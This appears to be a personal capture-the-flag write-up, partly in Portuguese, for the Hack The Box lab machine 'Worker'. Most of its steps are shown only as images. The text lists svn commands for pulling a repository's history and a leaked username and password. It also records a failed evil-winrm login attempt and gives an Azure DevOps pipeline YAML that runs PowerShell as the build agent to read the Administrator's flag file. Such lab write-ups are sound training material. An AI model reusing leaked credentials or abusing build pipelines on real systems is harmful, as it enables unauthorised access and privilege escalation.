Worker
========================

![qownnotes-media-JyrKqf](../../../media/qownnotes-media-JyrKqf.png)

![qownnotes-media-GTYzfR](../../../media/qownnotes-media-GTYzfR.png)

## HTTP

![qownnotes-media-byJROO](../../../media/qownnotes-media-byJROO.png)

    svn ls svn://10.10.10.203 #list
    svn log svn://10.10.10.203 #Commit history
    svn checkout svn://10.10.10.203 #Download the repository
    svn up -r 2 #Go to revision 2 inside the checkout folder
    

![qownnotes-media-JrLaFi](../../../media/qownnotes-media-JrLaFi.png)

![qownnotes-media-qmACRI](../../../media/qownnotes-media-qmACRI.png)

![qownnotes-media-RhNYOl](../../../media/qownnotes-media-RhNYOl.png)

$user = "nathen" 

$plain = "wendel98"

    firefox http://devops.worker.htb/ekenas/_settings/
    

![qownnotes-media-vQxhrY](../../../media/qownnotes-media-vQxhrY.png)

Agora é uma questão de achar como fazer a shell reverse no Azure DevOps

Tentei dessa forma, mas não funcionou:

    evil-winrm -i 10.10.10.203 -u nathen -p wendel98

![qownnotes-media-cZNpIs](../../../media/qownnotes-media-cZNpIs.png)

```
# Starter pipeline
# Start with a minimal pipeline that you can customize to build and deploy your code.
# Add steps that build, run tests, deploy, and more:
# https://aka.ms/yaml

# This is for htb Worker Box :)

trigger:
- master

pool: 'Setup'

steps:
- powershell: type C:\Users\Administrator\Desktop\root.txt
  displayName: 'Privesc'
```
